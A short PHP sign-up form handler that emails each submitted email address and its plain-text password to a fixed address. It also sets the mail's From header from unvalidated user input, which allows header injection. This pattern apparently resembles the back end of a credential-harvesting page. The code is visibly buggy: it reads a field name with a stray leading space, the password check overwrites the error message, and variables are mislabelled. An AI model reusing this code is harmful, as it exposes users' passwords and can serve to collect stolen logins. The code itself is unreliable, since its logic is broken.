<?php

$errorMSG = "";


// EMAIL
if (empty($_POST["email"])) {
    $errorMSG .= "Email is required ";
} else {
    $email = $_POST["email"];
}

// Password
if (empty($_POST["password"])) {
    $errorMSG = "Password is required ";
} else {
    $name = $_POST["password"];
}


// Password
if (empty($_POST[" password"])) {
    $errorMSG .= "Confirm password ";
} else {
    $message = $_POST[" password"];
}


$EmailTo = "emailaddress@test.com";
$Subject = "Sign up Succeeded";

// prepare email body text
$Body = "";
$Body .= "Password: ";
$Body .= $name;
$Body .= "\n";
$Body .= "Email: ";
$Body .= $email;
$Body .= "\n";
$Body .= "Password: ";
$Body .= $message;
$Body .= "\n";

// send email
$success = mail($EmailTo, $Subject, $Body, "From:".$email);

// redirect to success page
if ($success && $errorMSG == ""){
   echo "success";
}else{
    if($errorMSG == ""){
        echo "Something went wrong :(";
    } else {
        echo $errorMSG;
    }
}

?>